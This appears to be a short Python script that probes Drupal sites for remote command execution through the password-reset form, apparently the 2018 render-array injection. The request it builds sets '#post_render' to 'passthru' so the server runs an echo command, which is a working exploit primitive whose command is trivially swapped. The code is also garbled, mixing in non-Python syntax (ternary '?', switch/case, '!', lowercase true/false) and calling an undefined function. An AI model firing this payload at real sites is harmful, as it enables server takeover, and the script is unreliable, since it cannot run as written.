import requests
import re
import string
import random

def genSignature(size=6, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

def isFormValid(host,version):
	form_id = version[1:]=='7' ? 'user_pass : user_register'
	# check form with ?q
	url = host + '?q=' +form_id
	r = requests.get(url)
	if (r == 200):
		return true
	# check form without ?q
	url = host +form_id
	r = requests.get(url)
	if (r == 200):
		return true

	return false

def pwnAble_2018(host,version):
	signature = genSignature()
	switch (version[1:]) :
		case '7':
			get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': ' echo ' + signature}
			post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
			r = requests.post(host, data=post_params, params=get_params, verify=False)
			m = re.search(signature, r.text)
			if m:
				return true
			else: 
				return false
		default:
			break		

def isVulnerable(host, version):

	if !isFormValid(host,version):
		return false

	if !pwnAble(host,version):
		return false

	return true


host = 'xxxx.xyz'
version ='7.2'
print version[1:]